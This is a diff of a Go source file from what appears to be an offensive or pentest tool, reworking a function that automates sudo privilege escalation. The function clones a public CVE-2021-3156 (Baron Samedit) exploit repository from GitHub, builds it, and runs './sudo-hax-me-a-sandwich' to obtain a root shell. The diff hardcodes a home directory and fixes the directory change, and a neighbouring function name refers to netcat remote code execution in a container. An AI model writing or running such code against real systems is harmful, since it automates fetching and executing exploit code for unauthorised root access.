@@ -660,8 +660,67 @@ func SudoPotentialPrivilegeEscalation() {
 
 }
 
-// Designed for obtain shell and execute task with root privileges.
+// // Designed for obtain shell and execute task with root privileges.
+// func SudoPotentialPrivilegeEscalationExploitation() {
+
+// 	// Clonar el repositorio
+// 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
+// 	cloneOut, cloneErr := cloneCmd.CombinedOutput()
+// 	if cloneErr != nil {
+// 		fmt.Printf("Error al clonar el repositorio: %v\n", cloneErr)
+// 		fmt.Printf("Salida del comando: %s\n", cloneOut)
+// 		return
+// 	}
+// 	fmt.Println("Repositorio clonado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", cloneOut)
+
+// 	// Cambiar al directorio del repositorio
+// 	cdCmd := exec.Command("cd", "CVE-2021-3156")
+// 	cdOut, cdErr := cdCmd.CombinedOutput()
+// 	if cdErr != nil {
+// 		fmt.Printf("Error al cambiar al directorio: %v\n", cdErr)
+// 		fmt.Printf("Salida del comando: %s\n", cdOut)
+// 		return
+// 	}
+// 	fmt.Println("Cambiado al directorio CVE-2021-3156")
+// 	fmt.Printf("Salida del comando: %s\n", cdOut)
+
+// 	// Ejecutar 'make'
+// 	makeCmd := exec.Command("make")
+// 	makeOut, makeErr := makeCmd.CombinedOutput()
+// 	if makeErr != nil {
+// 		fmt.Printf("Error al ejecutar 'make': %v\n", makeErr)
+// 		fmt.Printf("Salida del comando: %s\n", makeOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando 'make' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", makeOut)
+
+// 	// Ejecutar './sudo-hax-me-a-sandwich'
+// 	runCmd := exec.Command("./sudo-hax-me-a-sandwich")
+// 	runOut, runErr := runCmd.CombinedOutput()
+// 	if runErr != nil {
+// 		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich': %v\n", runErr)
+// 		fmt.Printf("Salida del comando: %s\n", runOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando './sudo-hax-me-a-sandwich' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", runOut)
+
+// 	// Continuar con el flujo del programa
+// 	fmt.Println("Continuando con el flujo del programa")
+
+// }
+
 func SudoPotentialPrivilegeEscalationExploitation() {
+
+	// Cambiar al directorio home del usuario
+	homeDir := "/home/pepe"
+	if err := os.Chdir(homeDir); err != nil {
+		fmt.Printf("Error al cambiar al directorio home: %v\n", err)
+		return
+	}
+	fmt.Printf("Directorio de trabajo cambiado a: %s\n", homeDir)
 
 	// Clonar el repositorio
 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
@@ -674,16 +733,12 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	fmt.Println("Repositorio clonado exitosamente")
 	fmt.Printf("Salida del comando: %s\n", cloneOut)
 
-	// Cambiar al directorio del repositorio
-	cdCmd := exec.Command("cd", "CVE-2021-3156")
-	cdOut, cdErr := cdCmd.CombinedOutput()
-	if cdErr != nil {
-		fmt.Printf("Error al cambiar al directorio: %v\n", cdErr)
-		fmt.Printf("Salida del comando: %s\n", cdOut)
+	// Cambiar al directorio del repositorio clonado
+	if err := os.Chdir("CVE-2021-3156"); err != nil {
+		fmt.Printf("Error al cambiar al directorio del repositorio: %v\n", err)
 		return
 	}
 	fmt.Println("Cambiado al directorio CVE-2021-3156")
-	fmt.Printf("Salida del comando: %s\n", cdOut)
 
 	// Ejecutar 'make'
 	makeCmd := exec.Command("make")
@@ -709,7 +764,6 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 
 	// Continuar con el flujo del programa
 	fmt.Println("Continuando con el flujo del programa")
-
 }
 
 func NetcatRemoteCodeExecutionInContainer() {
